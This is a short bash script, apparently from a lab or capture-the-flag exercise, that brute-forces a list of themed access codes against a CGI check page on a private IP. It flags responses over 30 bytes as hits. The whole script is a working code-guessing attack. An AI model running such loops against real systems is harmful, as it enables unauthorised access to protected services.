#!/bin/bash
URL="http://10.65.150.239:8080/cgi-bin/psych_check.sh"

codes=(1982 hopkins guard hopper psych ward 9364 6429 8555 2519 5585 520 644 9300 1234 6969 1337 Hopkins82 Guard1982)

for code in "${codes[@]}"; do
  echo -n "Testing $code... "
  size=$(curl -s -d "code=$code" "$URL" | wc -c)
  if [ $size -gt 30 ]; then
    echo "🎯 POTENTIAL HIT ($size bytes)"
    curl -s -d "code=$code" "$URL"
    echo "---"
  else
    echo "$size bytes"
  fi
  sleep 0.5
done
